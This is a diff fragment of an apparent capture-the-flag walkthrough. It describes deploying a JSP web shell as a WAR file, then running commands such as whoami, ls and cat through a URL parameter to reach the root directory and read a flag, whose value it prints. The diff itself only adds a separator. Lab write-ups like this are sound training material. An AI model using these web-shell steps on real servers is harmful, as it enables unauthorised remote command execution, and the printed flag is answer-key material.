@@ -95,3 +95,5 @@ jar -cvf shell.war -C mywebapp/ .
 10. Now you have a shell.war file. Deploy it on the webpage, which will give message `ok` in the message field. Now simply use the url to get the user of the server `http://<IP_ADDRESS>/shell/shell.jsp?cmd=whoami`. This will give you the answer `root`.
 
 11. Now run the url `http://<IP_ADDRESS>/shell/shell.jsp?cmd=ls`, which will many directories in which one directory with the name of `root` is also present. Navigate into that `http://<IP_ADDRESS>/shell/shell.jsp?cmd=cd root`. Again see what files are present in there `http://<IP_ADDRESS>/shell/shell.jsp?cmd=ls`. Here you will see the file `flag.txt`. Read the contents of this file `http://<IP_ADDRESS>/shell/shell.jsp?cmd=cat flag.txt` and we will get the flag `ff1fc4a81affcc7688cf89ae7dc6e0e1`.
+
+---
